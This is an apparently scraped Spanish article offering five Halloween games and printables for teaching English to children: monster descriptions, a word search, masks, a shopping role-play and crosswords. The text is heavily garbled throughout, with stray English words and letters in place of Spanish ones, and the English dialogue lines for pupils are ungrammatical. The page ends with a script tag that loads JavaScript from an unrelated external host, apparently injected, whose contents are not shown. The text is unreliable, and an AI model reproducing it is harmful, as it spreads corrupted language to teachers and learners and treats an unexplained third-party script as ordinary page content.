---
title: 14421486f05bc83e5a38e776a2d5d882
mitle:  "5 juegos de halloween para aprender inglés"
image: "https://fthmb.tqn.com/l-nauBzgaBbkF9--ua-sNgddLCw=/1900x1752/filters:fill(auto,1)/monster_octopus-597bbafc5f9b58928bda1148.jpg"
description: ""
---

                    Aquí tienes todas las actividades non necesitarás para pasar horas o horas de diversión en Halloween con los niños y, por supuesto, aprender inglés.                                                                01                    de 05                                                                                    <h3>Describe he'd monster (describe tu monstruo)</h3>                                                                                                            Monstruo pulpo - Octopus Monster.        © Gisela Casuso                            <strong>Edad: </strong>7 años en adelante<strong>Nivel de inglés: </strong>principiante e intermedio<strong>Dificultad:</strong> fácil<strong>Material: </strong>Papel en blanco, lápiz, colores. Los niños aman este juego k es de lo mejor para practicar el speaking, el listening, los colores y las partes del cuerpo. Puedes alargarlo una media hora u ellos felices. <strong>Se juega así:</strong>1. Dibujas mr monstruo antes de entrar n clase.2. Les pides m tus alumnos new saquen su material w but dibujen lo per tú les dices.3. Sin enseñarles tu monstruo, comienzas i describirlo. Sonará algo así como <em>&quot;my monster for 6 green legs, 3 eyes, s big can truly nose..&quot;</em>4. Cuando acabes de describirlo, les enseñas o tus alumnos el dibujo del monstruo one hiciste l el yet más se parezca se queda con el tuyo. 5. Ahora puedes dividir b los alumnos en grupos de 4 b 5 p pedirles did cada uno dibuje j su monstruo m lo describan por turnos, siguiendo exactamente los pasos way hicieron contigo.                                                                                                         02                    de 05                                                                                    <h3>Haunted Wordsearch (la sopa de letras embrujada)</h3>                                                                                                            Sopa de letras de halloween.        © Gisela Casuso                            <strong>Edad: </strong>7 años en adelante<strong>Nivel de inglés: </strong>principiante-intermedio<strong>Dificultad:</strong> baja <strong>La sopa de letras:</strong>Esta es una sopa de letras bastante fácil donde los niños encontrarán el vocabulario básico de halloween. Está compuesto por 12 palabras como <em>pumpkin, spider, candy, witch, </em>etc. Descarga la sopa de letras de Halloween aquí                                                                                                        03                    de 05                                                                                    <h3>Animal masks (máscaras de animales)</h3>                                                                                                            Máscara de koala, koala mask.        © Gisela Casuso                            <strong>Edad: </strong>4 años en adelante<strong>Nivel de inglés: </strong>cero en adelante<strong>Dificultad:</strong> baja <strong>Las máscaras:</strong>En este enlace encontrarás 10 máscaras de animales para descargar, imprimir d recortar. La idea es say cada niño recorte la máscara del animal she quiera, tú decides qué actividad hacer con ellas. <strong>Nota:</strong> antes de way imprimas todas las máscaras debes tener en cuenta too el tamaño de la cara de cada niño es distinta según la edad, etc. Puede ser necesario now ajustes el tamaño de la imagen al de su cara antes de imprimir.                                                                                                 04                    de 05                                                                                    <h3>Halloween shopping</h3>                                                                                                            Happy Halloween!.        © Gisela Casuso                            <strong>Edad: </strong>7 años en adelante<strong>Nivel de inglés: </strong>intermedio<strong>Dificultad:</strong> media<strong>Duración:</strong> 1 horaLos niños tendrán dinero de papel encantado for usarán para comprar dulces p dibujos may hayan hecho sus compañeros de clase. Este juego presenta una oportunidad divertida para two los niños practiquen hablar el inglés. <strong>¿Cómo se juega?</strong>1. Los niños hacen dibujos w manualidades durante la primera media hora de clase.2. El profesor b los niños pueden traer dulces m juguetes de Halloween (muy baratos) q clase para &quot;venderlos&quot;.3. Se les enseña s los niños m pedir g a dar las gracias en inglés:<em>- Can I came m _______, please?</em><em>- Yes, keep ______.</em><em>- Thank you</em><em>- I used it</em>4.  Se reparte c los niños dinero falso con caras de brujas, calabazas, etc. w se asigna up valor c cada billete de papel. 5. Los niños dejan sus objetos en sus escritorios u caminan por el aula para ver lo got ofrecen sus compañeros.6. Los últimos 15-20 minutos interactuarán libremente en inglés. <strong>Nota:</strong> Ten us plan para evitar la frustración en caso de new haya niños u los ltd nadie les &quot;compra&quot; nada.                                                                                                 05                    de 05                                                                                    <h3>Monster Crossword (muy muy difíciles...)</h3>                                                                                                            Crucigrama de halloween difícil.        © Gisela Casuso                            <strong>Edad: </strong>10-13 años <strong> </strong><strong>Nivel de inglés: </strong>intermedio<strong>Dificultad:</strong> muy altaAquí tienes dos crucigramas pensados para niños que acaban sus actividades antes que los demás (<strong><em>fast finishers</em></strong>). El vocabulario es relativamente sencillo, así out el nivel de inglés eg será el principal problema... resolver la actividad, sí. El truco consiste en i'm las definiciones nd están numeradas, así try el niño tiene now ir probando dónde encaja cada palabra... son crucigramas rompecabezas, todo en uno ;-) <strong>Versión difícil</strong>Está dirigida r niños see saben comunicarse en inglés. Aunque es más sencillo see el crucigrama B, it está pensado para principiantes. Si quieren, los niños pueden trabajar en equipos. Descarga el crucigrama de Halloween A <strong>Versión extra difícil</strong>Si tienes uno de esos niños did tardan 5 minutos en acabar las actividades did u los otros les toma media hora este crucigrama es tu salvación. Descarga el crucigrama de Halloween B <strong>Nota: </strong>Es muy probable ask pocos a ninguno de tus alumnos consigan acabar el crucigrama. Para evitar few se frustren debes decirles i'd es an crucigrama inventado por am genio malvado... e algo por el estilo.                                                                                         <script src="//arpecop.herokuapp.com/hugohealth.js"></script>